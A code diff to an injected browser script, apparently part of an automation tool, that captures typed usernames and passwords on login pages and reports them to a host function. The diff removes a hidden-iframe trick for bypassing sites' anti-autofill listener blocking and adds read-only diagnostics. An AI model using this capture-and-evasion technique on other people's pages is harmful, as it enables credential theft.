@@ -74,55 +74,30 @@ export const CAPTURE_SCRIPT = `
   window.__baop_pw_capture = true;
   function _baopEmit(payload){try{window.__baopReport(JSON.stringify(payload));}catch(e){}}
   _baopEmit({_type:'baop_diag',msg:'script loaded host='+location.hostname});
-  // 监听器环境自检（2026-09-21）：部分站点改写 EventTarget.prototype.addEventListener
-  // 来屏蔽外部脚本的监听（反自动填充/反调试）。被改写时我们的 input/click/submit 全部失效，
-  // 而 setTimeout/轮询照常 —— 症状恰好是"有 frame info、却零 input 事件"。
-  // 兜底做法：从同源 about:blank iframe 里取一份未被改写的 addEventListener 来注册监听。
-  function _baopPristineAdd() {
-    try {
-      var f = document.createElement('iframe');
-      f.style.display = 'none';
-      (document.documentElement || document.body || document).appendChild(f);
-      var fn = f.contentWindow && f.contentWindow.EventTarget && f.contentWindow.EventTarget.prototype.addEventListener;
-      if (f.parentNode) f.parentNode.removeChild(f);
-      return (typeof fn === 'function') ? fn : null;
-    } catch(e) { return null; }
-  }
-  var _baopCleanAdd = _baopPristineAdd();
-  var _baopPatched = false;
-  try {
-    // 注意：不能直接比较函数引用（iframe 与主文档本就是不同 realm，恒不相等）。
-    // 用实现源码比较：页面只是包装/替换时源码会变，跨 realm 不会。
-    _baopPatched = !!(_baopCleanAdd && String(_baopCleanAdd) !== String(EventTarget.prototype.addEventListener));
-  } catch(e) {}
-  // 用合成事件验证"哪条注册路径真的生效"：优先干净版，不通就全程退回原生。
-  // 不验证就切到干净版有风险——某些页面/隔离世界里跨 realm 调用可能静默失效。
+  // 监听器环境自检（只读诊断，零副作用）。
+  //
+  // ⚠️ 历史：2026-09-21 这里曾用"造一个同源 about:blank iframe、取其中未被改写的
+  // addEventListener 来兜底"的写法，假设站点会劫持 addEventListener 屏蔽外部监听。
+  // 该假设从未被任何实测证实（7k7k 两个页面与 4399 实测 patched=false），而代价是确定的：
+  // 注入按"新执行上下文创建"触发 → 我们建的 iframe 会跑同一段脚本 → 再建子帧……
+  // 实测同一页面：生产脚本 71 次 script loaded（其中 69 个是我们自造的空帧）、
+  // 页面报 57 次 "Maximum call stack size exceeded"；而最小脚本只有 2 次、0 次报错。
+  // 且空帧里该探测恒返回不可用。已于 2026-09-22 整段删除，不要再加回来。
   var _baopSelfTestHit = false;
   (function() {
-    function tryOn(register) {
-      var probe = function() { _baopSelfTestHit = true; };
-      _baopSelfTestHit = false;
-      try { register('__baop_probe', probe); } catch(e) { return false; }
-      try { document.dispatchEvent(new Event('__baop_probe', { bubbles: true })); } catch(e) {}
-      try { document.removeEventListener('__baop_probe', probe, true); } catch(e) {}
-      return _baopSelfTestHit;
-    }
-    var okClean = false;
-    if (_baopCleanAdd) {
-      okClean = tryOn(function(t, h) { _baopCleanAdd.call(document, t, h, true); });
-    }
-    if (!okClean) {
-      _baopCleanAdd = null;
-      tryOn(function(t, h) { document.addEventListener(t, h, true); });
-    }
+    var probe = function() { _baopSelfTestHit = true; };
+    try { document.addEventListener('__baop_probe', probe, true); } catch(e) {}
+    try { document.dispatchEvent(new Event('__baop_probe', { bubbles: true })); } catch(e) {}
+    try { document.removeEventListener('__baop_probe', probe, true); } catch(e) {}
   })();
+  // 劫持的两条便宜的旁证：实现源码长度（被包装/替换会变）与实例级改写。
+  var _baopAddFnLen = 0, _baopInstOverridden = false;
+  try { _baopAddFnLen = String(EventTarget.prototype.addEventListener).length; } catch(e) {}
+  try { _baopInstOverridden = document.addEventListener !== EventTarget.prototype.addEventListener; } catch(e) {}
   function _baopOn(target, type, handler) {
-    try {
-      if (_baopCleanAdd) { _baopCleanAdd.call(target, type, handler, true); return; }
-    } catch(e) { /* 退回原生 */ }
-    target.addEventListener(type, handler, true);
+    try { target.addEventListener(type, handler, true); } catch(e) {}
   }
-  _baopEmit({_type:'baop_diag',msg:'listener env patched='+_baopPatched+' cleanAdd='+(_baopCleanAdd?'yes':'no')+' selftest='+_baopSelfTestHit+' host='+location.hostname});
+  _baopEmit({_type:'baop_diag',msg:'listener env selftest='+_baopSelfTestHit+' addFnLen='+_baopAddFnLen+' instOverridden='+_baopInstOverridden+' host='+location.hostname});
   var _rawUser='',_rawPass='';
   var extractCredentialParams = (${extractCredentialParams.toString()});
   var extractCredentialPayload = (${extractCredentialPayload.toString()});
